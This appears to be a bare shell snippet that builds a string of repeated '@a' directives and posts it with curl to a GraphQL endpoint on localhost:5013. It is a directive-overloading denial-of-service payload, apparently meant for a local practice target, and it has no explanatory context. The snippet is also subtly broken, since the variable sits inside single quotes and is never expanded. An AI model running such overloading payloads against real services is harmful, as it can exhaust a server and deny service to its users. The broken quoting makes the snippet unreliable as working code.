overload=$(for i in $(seq 1 20); do echo -n @a  ; done ;)
curl 'http://localhost:5013/graphql' -X POST  -H "Content-Type: application/json" --data-raw '{"query":"\n  query {\n    __typename    $overload   \n   }\n }'
